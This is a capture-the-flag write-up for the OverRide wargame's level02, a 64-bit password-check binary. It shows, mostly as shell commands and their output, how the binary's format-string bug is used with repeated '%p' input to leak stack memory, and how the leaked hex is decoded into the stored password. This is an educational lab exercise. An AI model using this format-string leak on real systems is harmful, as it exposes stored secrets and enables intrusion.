# level 02

For the first time we have a x64 program that reads the password file and then check the user input against it to give a shell.

It also calls printf with a format string the user controls.
```shell
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: rewrite it in %p %d
--[ Password: javascript
*****************************************
rewrite it in 0x7fffffffe4d0 0 does not have access!
```

Let's check what the value of our format string is in hex
```shell
level02@OverRide:~$ python -c 'print "%p|".encode("hex")'
25707c
```

Let's now scan the memory to find it
```shell
level02@OverRide:~$ ./level02 < <(python -c 'print "%p|"*30')
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4d0|(nil)|(nil)|0x2a2a2a2a2a2a2a2a|0x2a2a2a2a2a2a2a2a|0x7fffffffe6c8|0x1f7ff9a08|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|0x100000000|(nil)|0x756e505234376848|0x45414a3561733951|0x377a7143574e6758|0x354a35686e475873|0x48336750664b394d|(nil)|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70| does not have access!
```

We can see that it's the 28th parameter to printf, more interesting looking at the posiiton of the variables in the stack, the password buffer should come right before it.
The trailing 0 confirms our suspicions.

Let's convert these blocks to ascii, while keeping in mind to account for the endianness
```
756e505234376848|45414a3561733951|377a7143574e6758|354a35686e475873|48336750664b394d
```

```shell
level02@OverRide:~$ python -c 'print "".join([i.decode("hex")[::-1] for i in "756e505234376848|45414a3561733951|377a7143574e6758|354a35686e475873|48336750664b394d".split("|")])'
[censored]
```
Nice!
